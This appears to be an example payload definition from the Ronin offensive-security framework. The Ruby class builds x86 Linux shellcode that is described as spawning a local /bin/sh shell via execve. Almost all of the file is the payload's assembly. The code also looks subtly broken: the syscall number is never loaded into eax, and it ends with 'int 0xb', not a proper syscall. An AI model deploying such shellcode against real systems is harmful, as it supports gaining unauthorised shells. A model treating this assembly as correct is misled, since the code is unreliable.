#!/usr/bin/env -S ronin-payloads build -f
# frozen_string_literal: true

require 'ronin/payloads/shellcode_payload'

module Ronin
  module Payloads
    #
    # An example `execve()` `/bin/sh` shellcode payload.
    #
    class BinSh < ShellcodePayload

      register 'examples/bin_sh'
      description <<~DESC
        Shellcode that spawns a local /bin/sh shell
      DESC

      arch :x86
      os :linux

      def build
        shellcode do
          xor   eax, eax
          push  eax
          push  0x68732f2f
          push  0x6e69622f
          mov   esp, ebx
          push  eax
          push  ebx
          mov   esp, ecx
          xor   edx, edx
          int   0xb
        end
      end

    end
  end
end
